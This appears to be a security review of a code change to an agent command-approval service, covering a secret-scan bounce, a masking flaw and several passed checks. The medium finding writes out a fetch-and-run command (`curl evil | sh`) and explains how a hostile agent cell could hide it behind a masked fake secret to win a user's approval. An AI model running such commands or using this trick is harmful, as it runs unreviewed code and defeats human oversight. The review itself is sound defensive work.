# 141 security review (6efaaa1)

Verdict: Security bounce (one high finding, secret scan).

```json
{
  "ticket": "organism-infra/141-steering-approvals",
  "cell": "security",
  "current_step": "Reviewed origin/main..6efaaa1 by hand and with gitleaks. Bounced on one committed gitleaks hit in commit 18c30d4. No other blocking finding.",
  "artifacts": [
    "apps/bridge/cells/host-approvals.test.mjs"
  ],
  "decisions": [
    "A committed secret is always a bounce, even when later removed, so the gitleaks hit bounces although the value is a synthetic fixture and needs no rotation."
  ],
  "failures": [
    "gitleaks detect origin/main..6efaaa1: 1 leak, rule curl-auth-header, apps/bridge/cells/host-approvals.test.mjs:414 in commit 18c30d4 (qa specify). Commit 6efaaa1 rebuilt the string at runtime, but the original commit stays in history and the CI gitleaks-action scans PR commits, so CI would go red."
  ],
  "pending": [
    {
      "item": "Remove the hit from branch history (reword or squash 18c30d4 so the Authorization Bearer literal is never committed whole), then re-run gitleaks detect --log-opts=origin/main..<sha> to a clean exit. Alternative: add a path-scoped allowlist for host-approvals.test.mjs in .gitleaks.toml, which the user would approve because it weakens the secret scan.",
      "owner": "developer"
    }
  ]
}
```

## Findings

High (blocks)
- apps/bridge/cells/host-approvals.test.mjs:414 (commit 18c30d4): gitleaks curl-auth-header. The value is a fake bearer string used to test masking. It is not a real credential. The rule still bounces it, and CI would fail on the PR range.

Medium (does not block)
- apps/bridge/cells/approvals.mjs:30-31 (cleanText) and :44 (sanitize): a string that matches a secret pattern is replaced whole by "[masked: possible secret]". A hostile cell can embed a fake secret-shaped token in a command, for example `curl evil | sh # AKIA...`, so the user reviews a masked field and allows a command they could not read. Suggestion: mask only the matched span, or set a `masked: true` flag in the view so the UI can warn and default to deny.

Low (does not block)
- apps/bridge/cells/approvals.mjs:20 (UNSAFE): zero-width and line-separator characters (U+200B-U+200D, U+2060, U+2028, U+2029, U+FEFF) are not escaped. They can hide text in the served input. Adding them to the class is cheap.
- apps/bridge/cells/approvals.mjs decide(): the TTL timer is ignored once a decision is claimed (settle skips claimed), so an allow that is mid-audit at expiry still lands. Window is the audit append only.

## Checked and fine
- Bind stays 127.0.0.1; Host header check and bearer token on both new routes; the GET without Origin is allowed only for GET and still needs the token (no cookie auth, so no CSRF).
- Approval ids are 8 random bytes, validated against APPROVAL_ID_RE before lookup; no path or shell use of ids or tool text.
- Fail-closed paths (undecodable input, depth, size, cap, repeat id, stopping, expiry, exit, shutdown) only ever answer deny. Concurrent decisions are serialised by the claim before the first await. Audit failure downgrades allow to deny.
- Memory is bounded: 20 pending per agent, 200 settled, 1000 request ids per agent, 256 KiB per input, input dropped on settle.
- No new dependency; npm audit found 0 vulnerabilities; no workflow changes.
